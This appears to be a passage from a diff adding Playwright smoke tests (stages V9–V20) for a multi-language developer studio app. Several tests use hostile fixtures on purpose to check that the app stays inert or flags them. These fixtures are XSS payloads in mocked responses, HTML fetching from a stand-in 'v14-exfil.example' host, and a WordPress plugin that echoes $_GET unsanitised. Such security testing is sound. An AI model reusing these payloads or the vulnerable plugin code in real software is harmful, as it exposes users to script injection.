@@ -2,7 +2,7 @@
 // No provider keys or model requests. PYTHON selects the installed engine interpreter.
 const { chromium } = require('playwright');
 const assert = require('node:assert/strict');
-const { spawn } = require('node:child_process');
+const { spawn, spawnSync } = require('node:child_process');
 const { mkdtempSync, readFileSync, writeFileSync, mkdirSync, rmSync, existsSync } = require('node:fs');
 const { tmpdir } = require('node:os');
 const path = require('node:path');
@@ -2007,6 +2007,910 @@ let browser;
     'Mocked V8 SDK controls must not change project files');
   await page.screenshot({path:path.join(output,'developer-studio-v8-toolchain-adapters.png')});
   await page.unrouteAll();
+
+  // V9: real multi-file .tex and .bib traversal through the authenticated backend.
+  const texDir=path.join(devProject,'thesis');
+  mkdirSync(path.join(texDir,'chapters'),{recursive:true});
+  writeFileSync(path.join(texDir,'main.tex'),
+    '\\documentclass{report}\n\\begin{document}\n'+
+    '\\chapter{Purpose}\\label{chap:purpose}\n'+
+    'Read \\ref{sec:method} and \\cite{author2026}.\n'+
+    '\\input{chapters/method}\n\\bibliography{references}\n\\end{document}\n');
+  writeFileSync(path.join(texDir,'chapters','method.tex'),
+    '\\section{Method}\\label{sec:method}\n');
+  writeFileSync(path.join(texDir,'references.bib'),
+    '@article{author2026,\n title={Unverified illustrative bibliography},\n year={2026}\n}\n');
+  const texBefore=readFileSync(path.join(texDir,'main.tex'));
+  await page.locator('#dsTexMain').fill('thesis/main.tex');
+  await page.locator('#dsTexAnalyse').click();
+  await page.waitForFunction(()=>document.querySelector('#dsTexStatus')?.textContent?.includes('2 .tex files'));
+  assert.match(await page.locator('#dsTexStatus').innerText(),/0 static diagnostics/);
+  assert.match(await page.locator('#dsTexResults').innerText(),/sec:method/);
+  assert.match(await page.locator('#dsTexResults').innerText(),/author2026/);
+  await page.locator('#dsTexCompletionKind').selectOption('citation');
+  await page.locator('#dsTexCompletionPrefix').fill('author');
+  await page.locator('#dsTexComplete').click();
+  await page.waitForFunction(()=>document.querySelector('#dsTexResults')?.textContent?.includes('author2026'));
+  await page.locator('#dsTexSnippet').selectOption('equation');
+  await page.locator('#dsTexSnippetCopy').click();
+  assert.match(await page.locator('.ds-tex-preview').first().inputValue(),/\\begin\{equation\}/);
+  await page.locator('#dsTexTemplate').selectOption('thesis');
+  await page.locator('#dsTexTemplatePreview').click();
+  await page.waitForFunction(()=>document.querySelector('#dsTexResults')?.textContent?.includes('chapters/introduction.tex'));
+  assert.equal(await page.locator('.ds-tex-preview').count(),3);
+  assert.deepEqual(readFileSync(path.join(texDir,'main.tex')),texBefore,
+    'LaTeX template previews never overwrite source');
+  writeFileSync(path.join(texDir,'chapters','method.tex'),
+    '\\section{Method}\\label{sec:changed}\n');
+  await page.locator('#dsTexAnalyse').click();
+  await page.waitForFunction(()=>document.querySelector('#dsTexStatus')?.textContent?.includes('1 static diagnostics'));
+  assert.match(await page.locator('#dsTexResults').innerText(),/unresolved-ref/);
+  assert.deepEqual(readFileSync(path.join(texDir,'main.tex')),texBefore,
+    'V9 analysis never executes TeX or modifies source');
+  await page.screenshot({path:path.join(output,'developer-studio-v9-latex-authoring.png')});
+  await page.locator('.ds-tex-row').getByRole('button',
+    {name:'Go to definition of author2026'}).first().click();
+  await page.waitForFunction(()=>document.querySelector('#dsFilename')?.textContent?.includes('references.bib'));
+  await page.locator('.ds-tab-select',{hasText:'main.ts'}).click();
+  await page.waitForFunction(()=>document.querySelector('#dsSourceText')?.value?.includes('read-only'));
+
+
+  // V10: actual local bibliography preflight + explicit consent for Crossref only.
+  // DOI endpoint is mocked; no real registry request in the browser smoke.
+  const bibSource=path.join(texDir,'references.bib');
+  writeFileSync(bibSource,
+    '@article{author2026,\n author={Doe, Jane},\n'+
+    ' title={A Registered Study},\n year={2026},\n'+
+    ' journal={Example Journal},\n doi={10.1234/automoto.2026}\n}\n');
+  const bibBefore=readFileSync(bibSource);
+  await page.locator('#dsBibMain').fill('thesis/main.tex');
+  let v10Lookups=0;
+  await page.route('**/api/developer/studio/bibliography/verify-doi',async route=>{
+    v10Lookups++;
+    const body=route.request().postDataJSON();
+    assert.equal(body.key,'author2026');
+    assert.equal(body.main,'thesis/main.tex');
+    const payload={
+      key:'author2026',doi:'10.1234/automoto.2026',
+      registry:{title:'Registry <img src=x onerror=alert(1)> title',
+        year:2026,publisher:'Example Publisher',peer_review_verified:false,
+        publication_authenticity_verified:false},
+      field_comparison:{title:false,year:true,first_author_family:true},
+      possible_mismatches:['possible Crossref bibliographic metadata mismatch'],
+      publication_authenticity_verified:false
+    };
+    await route.fulfill({status:200,contentType:'application/json',body:JSON.stringify(payload)});
+  });
+  await page.locator('#dsBibPreflight').click();
+  await page.waitForFunction(()=>document.querySelector('#dsBibStatus')?.textContent?.includes('1 records'));
+  assert.equal(v10Lookups,0,'V10 preflight cannot initiate a Crossref request');
+  assert.match(await page.locator('#dsBibResults').innerText(),/author2026/);
+  await page.locator('#dsBibEntry').selectOption('author2026');
+  await page.locator('#dsBibStyle').selectOption('harvard');
+  await page.locator('#dsBibFormat').click();
+  await page.waitForFunction(()=>document.querySelector('.ds-bib-preview')?.value?.includes('Doe, J.'));
+  assert.equal(v10Lookups,0,'Local reference preview must not call Crossref');
+  page.once('dialog',d=>d.dismiss());
+  await page.locator('#dsBibVerify').click();
+  assert.equal(v10Lookups,0,'Cancelling the registry prompt cannot send a DOI');
+  page.once('dialog',d=>d.accept());
+  await page.locator('#dsBibVerify').click();
+  await page.waitForFunction(()=>document.querySelector('#dsBibResults')?.textContent?.includes('Registry <img'));
+  assert.equal(v10Lookups,1);
+  assert.equal(await page.locator('#dsBibResults img').count(),0,
+    'Registry metadata must be inert text, not executable markup');
+  assert.deepEqual(readFileSync(bibSource),bibBefore,'V10 never saves external metadata into the source');
+  await page.screenshot({path:path.join(output,'developer-studio-v10-citation-preflight.png')});
+  await page.unrouteAll();
+
+  // V11: real UI, mock external compiler transport, separate execution consent.
+  // Python tests run a *real* bounded local subprocess and parse synthetic SyncTeX.
+  let v11Starts=0,v11PreviewReads=0,v11SyncForward=0,v11SyncReverse=0;
+  const v11Hash='b'.repeat(64), v11Pdf=Buffer.from(
+    '%PDF-1.4\n1 0 obj\n<</Type/Catalog>>\nendobj\n%%EOF\n').toString('base64');
+  await page.route('**/api/developer/studio/texbuild/**',async route=>{
+    const url=new URL(route.request().url());
+    const endpoint=url.pathname.split('/').at(-1);
+    const req=route.request().postDataJSON?.()||{};
+    let payload={};
+    if(endpoint==='engines'){
+      payload={auto_execute:false,platform_sandbox:false,engines:[
+        {name:'tectonic',status:'installed_not_executed',
+          executable:'/usr/local/bin/tectonic',sha256:v11Hash,size_bytes:12345},
+        {name:'latexmk',status:'unavailable'}]};
+    }else if(endpoint==='build'){
+      v11Starts++;
+      assert.equal(req.engine,'tectonic');
+      assert.equal(req.expected_sha256,v11Hash);
+      assert.equal(req.expected_executable,'/usr/local/bin/tectonic');
+      assert.equal(req.confirmed,true);
+      assert.equal(req.acknowledge_external_process_risk,true);
+      assert.equal(req.main,'thesis/main.tex');
+      payload={pdf_ready:true,build_id:'testonly-fakeid-012345678901234567890',
+        compiler:'tectonic',status:'completed',elapsed_ms:32,
+        input_file_count:4,input_bytes:1012,
+        pdf_size:56,pdf_sha256:'a'.repeat(64),
+        figures:[],table_locations:[{kind:'table',path:'thesis/main.tex',line:4}],
+        synctex_available:true,synctex_records:2,
+        diagnostics:[{severity:'warning',
+          message:'Unexpected <img src=x onerror=alert(1)> tool output',
+          path:null,line:null}],build_log:'<script>alert(1)</script> compiler log'};
+    }else if(endpoint==='preview'){
+      assert.equal(req.build_id,'testonly-fakeid-012345678901234567890');
+      v11PreviewReads++;
+      payload={pdf_base64:v11Pdf,pdf_sha256:'a'.repeat(64),
+        content_type:'application/pdf',cached_only:true};
+    }else if(endpoint==='source-to-pdf'){
+      v11SyncForward++;
+      assert.equal(req.path,'thesis/chapters/method.tex');
+      payload={path:req.path,requested_line:1,matched_line:1,page:2,
+        exact_line_match:true,page_navigation_only:true};
+    }else if(endpoint==='page-to-source'){
+      v11SyncReverse++;
+      assert.equal(req.page,2);
+      payload={page:2,path:'thesis/chapters/method.tex',line:1,
+        approximate_page_to_source:true};
+    }
+    await route.fulfill({status:200,contentType:'application/json',body:JSON.stringify(payload)});
+  });
+  await page.locator('#dsTexBuildMain').fill('thesis/main.tex');
+  await page.locator('#dsTexBuildInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsTexBuildEngine')?.options.length>=2);
+  await page.locator('#dsTexBuildEngine').selectOption('tectonic');
+  assert.equal(await page.locator('#dsTexBuildRun').isEnabled(),true);
+  page.once('dialog',dialog=>dialog.dismiss());
+  await page.locator('#dsTexBuildRun').click();
+  assert.equal(v11Starts,0,'Cancelling external execution must not start TeX');
+  page.once('dialog',dialog=>dialog.accept());
+  await page.locator('#dsTexBuildRun').click();
+  await page.waitForFunction(()=>document.querySelector('#dsTexBuildStatus')?.textContent?.includes('PDF build succeeded'));
+  assert.equal(v11Starts,1);
+  assert.equal(v11PreviewReads,0,'Compiler must not automatically load PDF preview');
+  assert.equal(await page.locator('#dsTexBuildSummary img').count(),0);
+  assert.equal(await page.locator('#dsTexBuildSummary script').count(),0);
+  await page.locator('#dsTexBuildPreview').click();
+  await page.waitForFunction(()=>document.querySelector('#dsTexBuildFrame')?.getAttribute('src')?.startsWith('blob:'));
+  assert.equal(v11PreviewReads,1);
+  await page.locator('#dsTexBuildSource').fill('thesis/chapters/method.tex');
+  await page.locator('#dsTexBuildLine').fill('1');
+  await page.locator('#dsTexBuildForward').click();
+  await page.waitForFunction(()=>document.querySelector('#dsTexBuildPage')?.value==='2');
+  assert.equal(v11SyncForward,1);
+  await page.locator('#dsTexBuildReverse').click();
+  await page.waitForFunction(()=>document.querySelector('#dsFilename')?.textContent?.includes('method.tex'));
+  assert.equal(v11SyncReverse,1);
+  await page.screenshot({path:path.join(output,'developer-studio-v11-tex-pdf-preview.png')});
+  await page.unrouteAll();
+  // V12: real local Typst/Quarto preflight, inert Research Studio review-only hand-off.
+  const v12Dir=path.join(devProject,'v12-manuscript');
+  mkdirSync(path.join(v12Dir,'chapters'),{recursive:true});
+  writeFileSync(path.join(v12Dir,'references.bib'),
+    '@article{smith2026,title={Verified local record},author={Smith, Anna},year={2026}}\n');
+  writeFileSync(path.join(v12Dir,'main.typ'),
+    '= Source analysis\n#include "chapters/chapter.typ"\n'+
+    'Refer to @smith2026.\n#bibliography("references.bib")\n');
+  writeFileSync(path.join(v12Dir,'chapters','chapter.typ'),'== Chapter\n');
+  const v12Fence=String.fromCharCode(96).repeat(3);
+  writeFileSync(path.join(v12Dir,'main.qmd'),
+    '---\ntitle: "Research"\nbibliography: references.bib\n'+
+    'execute:\n  enabled: false\n---\n# Findings\nSee [@missing2026].\n'+
+    v12Fence+'{python}\nprint("@ghost")\n'+v12Fence+'\n');
+  const v12Original=readFileSync(path.join(v12Dir,'main.typ'));
+  await page.locator('#dsManFormat').selectOption('typst');
+  await page.locator('#dsManMain').fill('v12-manuscript/main.typ');
+  await page.locator('#dsManScan').click();
+  await page.waitForFunction(()=>document.querySelector('#dsManStatus')?.textContent?.includes('Static analysis complete'));
+  assert.match(await page.locator('#dsManResult').innerText(),/Source analysis/);
+  assert.match(await page.locator('#dsManResult').innerText(),/No unresolved or duplicate keys/);
+  await page.locator('#dsManFormat').selectOption('quarto');
+  await page.locator('#dsManMain').fill('v12-manuscript/main.qmd');
+  await page.locator('#dsManScan').click();
+  await page.waitForFunction(()=>document.querySelector('#dsManResult')?.textContent?.includes('Unresolved citation: missing2026'));
+  assert.match(await page.locator('#dsManResult').innerText(),/1 Quarto code chunk/);
+  assert.doesNotMatch(await page.locator('#dsManResult').innerText(),/Unresolved citation: ghost/);
+  await page.locator('#dsManTools').click();
+  await page.waitForFunction(()=>document.querySelector('#dsManResult')?.textContent?.includes('pandoc'));
+  await page.locator('#dsManStarter').click();
+  await page.waitForFunction(()=>document.querySelector('.ds-manuscript-preview')?.value?.includes('Research manuscript'));
+  assert.equal(await page.locator('.ds-manuscript-preview').first().isEnabled(),true);
+
+  const v12Audit='artifacts/research/handoffs/handoff-'+('a'.repeat(24))+'.handoff.json';
+  let v12Exports=0,v12Previews=0;
+  await page.route('**/api/developer/studio/research-transfer/**',async route=>{
+    const endpoint=route.request().url().split('/').at(-1);
+    const posted=route.request().postDataJSON?.()||{};
+    let result={};
+    if(endpoint==='handoffs'){
+      result={handoffs:[{path:v12Audit,sha256:'b'.repeat(64),
+        target:'developer',research_question:'Independent source-reviewed evidence'}]};
+    }else if(endpoint==='preview'){
+      v12Previews++;
+      assert.equal(posted.handoff_path,v12Audit);
+      assert.equal(posted.format,'quarto');
+      assert.equal(posted.bindings.length,0);
+      result={written:false,publication_ready:false,
+        manifest:{review_only:true,publication_ready:false,manual_review_required:true},
+        files:[{path:'manuscript.qmd',text:'# Human-reviewed draft only\n'},
+          {path:'evidence.review.json',
+            text:'{"quote":"<script>alert(1)</script>","source_sha256":"'+('c'.repeat(64))+'"}'}]};
+    }else if(endpoint==='download'){
+      v12Exports++;
+      assert.equal(posted.confirmed,true);
+      assert.equal(posted.acknowledge_not_publication_ready,true);
+      result={filename:'automoto-research-quarto-review.zip',
+        zip_base64:Buffer.from('PK test-only archive fixture').toString('base64'),
+        manifest:{review_only:true,publication_ready:false}};
+    }
+    await route.fulfill({status:200,contentType:'application/json',body:JSON.stringify(result)});
+  });
+  await page.locator('#dsManHandoffs').click();
+  await page.waitForFunction(()=>document.querySelector('#dsManHandoffSelect')?.options.length===2);
+  await page.locator('#dsManHandoffSelect').selectOption(v12Audit);
+  await page.locator('#dsManReview').click();
+  await page.waitForFunction(()=>[...document.querySelectorAll('#dsManResult .ds-manuscript-preview')].some(x=>x.value.includes('source_sha256')));
+  assert.equal(await page.locator('#dsManResult .ds-manuscript-preview').count(),2);
+  assert.equal(v12Previews,1);
+  assert.equal(await page.locator('#dsManResult script').count(),0,
+    'V12 evidence must display inertly, never execute source markup');
+  page.once('dialog',dialog=>dialog.dismiss());
+  await page.locator('#dsManDownload').click();
+  assert.equal(v12Exports,0,'Cancelled publication review must not export a ZIP');
+  page.once('dialog',dialog=>dialog.accept());
+  await page.locator('#dsManDownload').click();
+  await page.waitForFunction(()=>document.querySelector('#dsManStatus')?.textContent?.includes('ZIP exported'));
+  assert.equal(v12Exports,1);
+  assert.deepEqual(readFileSync(path.join(v12Dir,'main.typ')),v12Original,
+    'Research hand-off must not overwrite project source');
+  await page.screenshot({path:path.join(output,'developer-studio-v12-typst-quarto-research.png')});
+  await page.unrouteAll();
+
+  // V13: inspect an actual local Node project; never auto-run a script or tool.
+  const v13Config=JSON.parse(readFileSync(path.join(devProject,'package.json'),'utf8'));
+  v13Config.name='automoto-v13-browser-real-node';
+  v13Config.private=true;
+  v13Config.engines={node:'>=20'};
+  v13Config.packageManager='npm@10.0.0';
+  v13Config.scripts.test='node --test v13-task.test.cjs';
+  v13Config.scripts.build='node --check v13-task.test.cjs';
+  v13Config.devDependencies={typescript:'^5.9.0'};
+  writeFileSync(path.join(devProject,'package.json'),JSON.stringify(v13Config));
+  writeFileSync(path.join(devProject,'v13-task.test.cjs'),
+    "const test=require('node:test');const assert=require('node:assert/strict');"+
+    "test('v13 genuine Node smoke',()=>assert.equal(3*7,21));\n");
+  const v13TestOriginal=readFileSync(path.join(devProject,'v13-task.test.cjs'));
+  await page.locator('#dsJsInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsJsStatus')?.textContent?.includes('Project inspected'));
+  assert.match(await page.locator('#dsJsSummary').innerText(),/Next.js/);
+  assert.match(await page.locator('#dsJsSummary').innerText(),/Manifest SHA-256/);
+  assert.equal(await page.locator('#dsJsSummary script').count(),0);
+  await page.locator('#dsJsTool').selectOption('node');
+  await page.locator('#dsJsTask').selectOption('node_test');
+  await page.locator('#dsJsFile').fill('v13-task.test.cjs');
+  assert.equal(await page.locator('#dsJsRun').isEnabled(),true);
+  page.once('dialog',dialog=>dialog.dismiss());
+  await page.locator('#dsJsRun').click();
+  assert.match(await page.locator('#dsJsStatus').innerText(),/Project inspected/,
+    'Cancelled V13 execution must not run the Node test');
+  page.once('dialog',dialog=>dialog.accept());
+  await page.locator('#dsJsRun').click();
+  await page.waitForFunction(()=>document.querySelector('#dsJsStatus')?.textContent?.includes('Task completed'));
+  assert.match(await page.locator('#dsJsSummary').innerText(),/v13 genuine Node smoke/);
+  assert.deepEqual(readFileSync(path.join(devProject,'v13-task.test.cjs')),v13TestOriginal);
+  await page.locator('#dsJsTask').selectOption('tool_version');
+  page.once('dialog',dialog=>dialog.accept());
+  await page.locator('#dsJsRun').click();
+  await page.waitForFunction(()=>document.querySelector('#dsJsSummary')?.textContent?.includes('Reported version: v'));
+  assert.match(await page.locator('#dsJsSummary').innerText(),/Reported version: v\d+/);
+  await page.screenshot({path:path.join(output,'developer-studio-v13-js-ts-project-tests.png')});
+
+  // V14: real local HTML/CSS, framework declarations, heuristic accessibility
+  // and a responsive sandboxed iframe that executes no source JavaScript.
+  writeFileSync(path.join(devProject,'v14-page.html'),
+    '<!doctype html><html lang="en"><head><meta name="viewport" content="width=device-width,initial-scale=1">'+
+    '<script>window.__V14_EXECUTED=true;</script>'+
+    '<link rel="stylesheet" href="https://v14-exfil.example/evil.css"></head>'+
+    '<body><main><h1>V14 Real responsive card</h1>'+
+    '<section class="v14-card">Native HTML remains readable</section>'+
+    '<img src="https://v14-exfil.example/pixel">'+
+    '<button onclick="window.__V14_EXECUTED=true"></button>'+
+    '<input id="missing-label"></main></body></html>');
+  writeFileSync(path.join(devProject,'v14-styles.css'),
+    '.v14-card{display:grid;gap:16px;padding:20px;background-color:#efefef;'+
+    'background-image:url(https://v14-exfil.example/danger)}');
+  writeFileSync(path.join(devProject,'v14-component.tsx'),
+    'export default function App(){return <main><h1>React component</h1></main>;}');
+  const v14Before=readFileSync(path.join(devProject,'v14-page.html'));
+  const v14Leaked=[];
+  page.on('request',req=>{if(req.url().includes('v14-exfil.example'))v14Leaked.push(req.url());});
+  await page.locator('#dsFeInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsFeStatus')?.textContent?.includes('Frontend inventory complete'));
+  assert.match(await page.locator('#dsFeFindings').innerText(),/Next\.js/);
+  assert.match(await page.locator('#dsFeFindings').innerText(),/React/);
+  await page.locator('#dsFeFile').fill('v14-component.tsx');
+  await page.locator('#dsFeAudit').click();
+  await page.waitForFunction(()=>document.querySelector('#dsFeStatus')?.textContent?.includes('Read-only source audit complete'));
+  assert.match(await page.locator('#dsFeFindings').innerText(),/dynamic framework syntax/);
+  await page.locator('#dsFeHtml').fill('v14-page.html');
+  await page.locator('#dsFeCss').fill('v14-styles.css');
+  await page.locator('#dsFePreview').click();
+  await page.waitForFunction(()=>document.querySelector('#dsFeStatus')?.textContent?.includes('Sanitised static preview ready'));
+  await page.frameLocator('#dsFeFrame').getByRole('heading',{name:'V14 Real responsive card'}).waitFor();
+  assert.match(await page.locator('#dsFeFindings').innerText(),/image-alt/);
+  assert.match(await page.locator('#dsFeFindings').innerText(),/button-name/);
+  assert.match(await page.locator('#dsFeFindings').innerText(),/input-name/);
+  assert.equal(await page.locator('#dsFeFrame').getAttribute('sandbox'),'');
+  assert.equal(await page.frameLocator('#dsFeFrame').locator('script').count(),0);
+  assert.equal(await page.frameLocator('#dsFeFrame').locator('iframe').count(),0);
+  assert.equal(await page.frameLocator('#dsFeFrame').locator('img').count(),0);
+  assert.equal(await page.frameLocator('#dsFeFrame').locator('.v14-card').count(),1);
+  assert.equal(await page.frameLocator('#dsFeFrame').locator('.v14-card').evaluate(
+    node=>getComputedStyle(node).display),'grid');
+  assert.equal(await page.frameLocator('#dsFeFrame').locator('body').evaluate(
+    ()=>Boolean(window.__V14_EXECUTED)),false,'HTML scripts must not execute in the preview');
+  await page.locator('#dsFeTablet').click();
+  assert.equal(await page.locator('#dsFeFrame').evaluate(node=>node.getBoundingClientRect().width),768);
+  await page.locator('#dsFeDesktop').click();
+  assert.equal(await page.locator('#dsFeFrame').evaluate(node=>node.getBoundingClientRect().width),1440);
+  await page.locator('#dsFeMobile').click();
+  assert.equal(await page.locator('#dsFeFrame').evaluate(node=>node.getBoundingClientRect().width),375);
+  assert.equal(v14Leaked.length,0,'Static preview must not fetch any remote source assets');
+  assert.deepEqual(readFileSync(path.join(devProject,'v14-page.html')),v14Before,
+    'V14 must never write project HTML');
+  await page.screenshot({path:path.join(output,'developer-studio-v14-responsive-a11y-preview.png')});
+
+  // V15: real SQLite snapshot SELECT and rollback-only schema migration.
+  const v15Db=path.join(devProject,'v15-data.sqlite');
+  const v15Seed=spawnSync(process.env.PYTHON||'python',
+    ['-c',"import sqlite3,sys; c=sqlite3.connect(sys.argv[1]);"+
+      "c.execute('CREATE TABLE products(id INTEGER PRIMARY KEY,name TEXT)');"+
+      "c.execute('INSERT INTO products(name) VALUES (?)',('A real item',));"+
+      "c.commit();c.close()",v15Db],{encoding:'utf8'});
+  assert.equal(v15Seed.status,0,'V15 SQLite fixture failed: '+v15Seed.stderr);
+  writeFileSync(path.join(devProject,'v15-schema.graphql'),
+    'type Query {\n products: [Product!]!\n version: String\n}\n'+
+    'type Product {\n name: String!\n}\n');
+  const v15DbBefore=readFileSync(v15Db);
+  await page.locator('#dsDataDB').fill('v15-data.sqlite');
+  await page.locator('#dsDataSchema').click();
+  await page.waitForFunction(()=>document.querySelector('#dsDataOutput')?.textContent?.includes('"name": "products"'));
+  await page.locator('#dsDataQuery').fill('SELECT name FROM products WHERE id = ?');
+  await page.locator('#dsDataArgs').fill('[1]');
+  await page.locator('#dsDataRun').click();
+  await page.waitForFunction(()=>document.querySelector('#dsDataOutput')?.textContent?.includes('A real item'));
+  await page.locator('#dsDataMigration').fill('ALTER TABLE products ADD COLUMN reviewed INTEGER');
+  page.once('dialog',dialog=>dialog.dismiss());
+  await page.locator('#dsDataPreview').click();
+  assert.equal(await page.locator('#dsDataOutput').innerText().then(t=>t.includes('migration_applied')),false);
+  page.once('dialog',dialog=>dialog.accept());
+  await page.locator('#dsDataPreview').click();
+  await page.waitForFunction(()=>document.querySelector('#dsDataOutput')?.textContent?.includes('"rollback_verified": true'));
+  assert.equal(await page.locator('#dsDataOutput').innerText().then(t=>t.includes('"migration_applied": false')),true);
+  assert.deepEqual(readFileSync(v15Db),v15DbBefore,'V15 migration preview must not write source SQLite bytes');
+  await page.locator('#dsDataSchemaFile').fill('v15-schema.graphql');
+  await page.locator('#dsDataInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsDataOutput')?.textContent?.includes('"name": "Query"'));
+  await page.locator('#dsDataOperation').fill('mutation { destroyAll }');
+  await page.locator('#dsDataGraphQL').click();
+  await page.waitForFunction(()=>document.querySelector('#dsDataOutput')?.textContent?.includes('"allowed": false'));
+  assert.equal(await page.locator('#studioAgentSend').isDisabled(),true);
+  await page.locator('#studioAgentMessage').fill('Review the V15 SQLite migration and rollout risks.');
+  page.once('dialog',dialog=>dialog.dismiss());
+  await page.locator('#studioAgentSend').click();
+  assert.match(await page.locator('#studioAgentResult').innerText(),/confirm|shared|review/i);
+  await page.screenshot({path:path.join(output,'developer-studio-v15-sql-agent-bridge.png')});
+
+  // V16: real WordPress plugin fixture, source-safe patch and shared Agent readiness.
+  const v16Plugin=path.join(devProject,'v16-reviewable-plugin.php');
+  const v16Original=[
+    '<?php','/*','Plugin Name: V16 Reviewable Plugin','Version: 1.0.0','*/',
+    "add_action( 'admin_notices', 'v16_review_notice' );",
+    "register_activation_hook( __FILE__, 'v16_review_activate' );",
+    "function v16_review_activate() { update_option( 'v16_setting', true ); }",
+    "function v16_review_notice() {",
+    "    echo $_GET['notice'];",
+    "}",''
+  ].join('\n');
+  writeFileSync(v16Plugin,v16Original);
+  await page.locator('#dsPhpInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsPhpStatus')?.textContent?.includes('Project inspected'));
+  assert.match(await page.locator('#dsPhpResults').innerText(),/V16 Reviewable Plugin/);
+  assert.match(await page.locator('#dsPhpResults').innerText(),/raw-superglobal-echo/);
+  await page.locator('#dsPhpPath').fill('v16-reviewable-plugin.php');
+  await page.locator('#dsPhpPatch').click();
+  await page.waitForFunction(()=>document.querySelector('#dsPhpStatus')?.textContent?.includes('Proposed limited WordPress fix'));
+  assert.match(await page.locator('#dsPhpResults .ds-php-source').inputValue(),/sanitize_text_field/);
+  assert.match(await page.locator('#dsPhpResults .ds-php-source').inputValue(),/register_activation_hook/);
+  assert.deepEqual(readFileSync(v16Plugin,'utf8'),v16Original,
+    'V16 fix preview must never silently edit the WordPress plugin');
+  await page.locator('#dsPhpAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/WordPress plugin security and hook/);
+  assert.match(await page.locator('#dsPhpStatus').innerText(),/Send separately with your confirmation/);
+  assert.deepEqual(readFileSync(v16Plugin,'utf8'),v16Original,
+    'Central Agent review preparation must not deploy or change project source');
+  await page.screenshot({path:path.join(output,'developer-studio-v16-php-wordpress-agent.png')});
+
+  // V17: actual Python manifest and AST, no source execution or Agent release.
+  const v17Python=path.join(devProject,'v17-real.py');
+  const v17Source='def v17_greet(name: str) -> str:\n    return "Hi " + name\n';
+  writeFileSync(v17Python,v17Source);
+  writeFileSync(path.join(devProject,'pyproject.toml'),
+    '[project]\nname = "v17-browser-fixture"\nrequires-python = ">=3.10"\ndependencies = ["fastapi>=0.115"]\n');
+  writeFileSync(path.join(devProject,'uv.lock'),'version = 1\n');
+  await page.locator('#dsPyInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsPyStatus')?.textContent?.includes('inspection complete'));
+  assert.match(await page.locator('#dsPyResults').innerText(),/FastAPI/);
+  assert.match(await page.locator('#dsPyResults').innerText(),/uv.lock/);
+  await page.locator('#dsPySource').fill('v17-real.py');
+  await page.locator('#dsPySyntax').click();
+  await page.waitForFunction(()=>document.querySelector('#dsPyStatus')?.textContent?.includes('AST parse successful'));
+  assert.match(await page.locator('#dsPyResults').innerText(),/1 functions and 0 classes/);
+  assert.deepEqual(readFileSync(v17Python,'utf8'),v17Source,'V17 AST must not modify source');
+  await page.locator('#dsPyAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V17 Python deployment readiness/);
+  assert.deepEqual(readFileSync(v17Python,'utf8'),v17Source,'V17 Agent review cannot deploy');
+  await page.screenshot({path:path.join(output,'developer-studio-v17-python-emerging.png')});
+
+  // V18: real Go module and HTTP-service source. Inspection must remain inert.
+  const v18Go=path.join(devProject,'v18-handler.go');
+  const v18GoSource='package main\nimport "net/http"\nfunc main() { http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) { w.WriteHeader(200) }) }\n';
+  writeFileSync(v18Go,v18GoSource);
+  writeFileSync(path.join(devProject,'go.mod'),'module example.com/v18/browser\n\ngo 1.22\n');
+  await page.locator('#dsGoInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsGoStatus')?.textContent?.includes('Go project inspected'));
+  assert.match(await page.locator('#dsGoResults').innerText(),/Go modules and workspace/);
+  assert.match(await page.locator('#dsGoResults').innerText(),/example\.com\/v18\/browser/);
+  assert.match(await page.locator('#dsGoResults').innerText(),/Service imports: http/);
+  assert.deepEqual(readFileSync(v18Go,'utf8'),v18GoSource,
+    'V18 Go inspection must not execute or change source');
+  await page.locator('#dsGoAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V18 Go service release readiness/);
+  assert.deepEqual(readFileSync(v18Go,'utf8'),v18GoSource,'Agent review must not deploy');
+  await page.screenshot({path:path.join(output,'developer-studio-v18-go-workspaces.png')});
+
+  // V19: read-only Rust Cargo project discovery, source symbols and Agent boundary.
+  const v19RustFile=path.join(devProject,'v19-lib.rs');
+  const v19RustSource='pub fn v19_greet(name: &str) -> String {\n    format!("Hello, {name}")\n}\n';
+  writeFileSync(v19RustFile,v19RustSource);
+  writeFileSync(path.join(devProject,'Cargo.toml'),
+    '[package]\nname = "v19-browser"\nversion = "0.1.0"\nedition = "2021"\n\n[lib]\npath = "v19-lib.rs"\n');
+  writeFileSync(path.join(devProject,'Cargo.lock'),
+    'version = 4\n\n[[package]]\nname = "v19-browser"\nversion = "0.1.0"\n');
+  await page.locator('#dsRsInspect').click();
+  await page.waitForFunction(()=>document.querySelector('#dsRsStatus')?.textContent?.includes('inspection completed'));
+  assert.match(await page.locator('#dsRsResults').innerText(),/v19-browser/);
+  assert.match(await page.locator('#dsRsResults').innerText(),/v19_greet/);
+  assert.match(await page.locator('#dsRsResults').innerText(),/Cargo.lock/);
+  assert.deepEqual(readFileSync(v19RustFile,'utf8'),v19RustSource,
+    'V19 Cargo inspection cannot alter source');
+  await page.locator('#dsRsAgent').click();
+  assert.equal(await page.locator('#studioAgentAction').inputValue(),'deployment_readiness');
+  assert.match(await page.locator('#studioAgentMessage').inputValue(),/V19 Rust workspace release readiness/);
+  assert.deepEqual(readFileSync(v19RustFile,'utf8'),v19RustSource,
+    'V19 shared Agent review must not deploy or modify source');
+  await page.screenshot({path:path.join(output,'developer-studio-v19-rust-workspaces.png')});
+
+  // V20: CMake/C++ read-only inspection, redacted compile commands and shared Agent.
+  const v20NativeFile=path.join(devProject,'v20-browser.cpp');
+  const v20NativeSource='#include <iostream>\nint native_test() { return 20 + 20; }\n';
+  writeFileSync(v20NativeFile,v20NativeSource);
+  writeFileSync(path.join(devProject,'CMakeLists.txt'),
